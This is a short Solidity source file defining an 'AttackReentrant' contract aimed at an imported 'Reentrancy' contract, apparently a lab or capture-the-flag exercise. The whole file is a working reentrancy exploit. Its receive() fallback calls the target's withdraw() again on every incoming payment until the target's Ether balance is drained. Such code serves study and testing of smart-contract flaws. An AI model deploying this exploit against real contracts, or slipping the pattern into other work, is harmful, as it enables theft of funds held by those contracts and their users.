// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import {Reentrancy} from "./Reentrancy.sol";

contract AttackReentrant {
    Reentrancy public reentrance;

    constructor(address _reentranceAddress) {
        reentrance = Reentrancy(payable(_reentranceAddress));
    }

    function withdraw() public {
        reentrance.withdraw(reentrance.balanceOf(address(this)));
    }

    receive() external payable {
        if (address(reentrance).balance > reentrance.balanceOf(address(this))) {
            reentrance.withdraw(reentrance.balanceOf(address(this)));
        } else if (address(reentrance).balance != 0) {
            reentrance.withdraw(address(reentrance).balance);
        }
    }
}
